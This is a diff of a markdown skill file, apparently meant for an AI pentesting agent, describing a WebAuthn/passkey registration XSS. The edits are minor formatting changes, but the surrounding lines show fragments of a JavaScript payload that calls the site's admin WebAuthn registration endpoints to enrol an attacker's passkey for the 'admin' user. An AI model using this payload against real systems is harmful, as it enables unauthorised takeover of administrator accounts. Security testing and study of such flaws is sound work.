@@ -4,7 +4,7 @@ description: 'WebAuthn注册XSS攻击：credential.name不转义→注入JS→ad
 disable-model-invocation: true
 metadata: { domain: web, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+
 
 ## WebAuthn/Passkey Registration XSS
 
@@ -51,7 +51,7 @@ fetch('/api/webauthn/register/initiate',{method:'POST'})
     })
   })
 })">
-```
+```text
 
 ### 简化版（如果 API 接受标准 WebAuthn JSON）
 ```html
@@ -61,7 +61,7 @@ fetch('/api/admin/webauthn/register/initiate',{method:'POST'})
   navigator.credentials.create({publicKey:{...c,user:{id:Uint8Array.from('admin'.split('').map(c=>c.charCodeAt(0))),name:'admin',displayName:'admin'}}})
   .then(cred=>fetch('/api/admin/webauthn/register/complete',{method:'POST',body:JSON.stringify(cred)}))
 })">
-```
+```text
 
 ### Chrome DevTools 配置
 1. F12 → ⋮ → More tools → WebAuthn
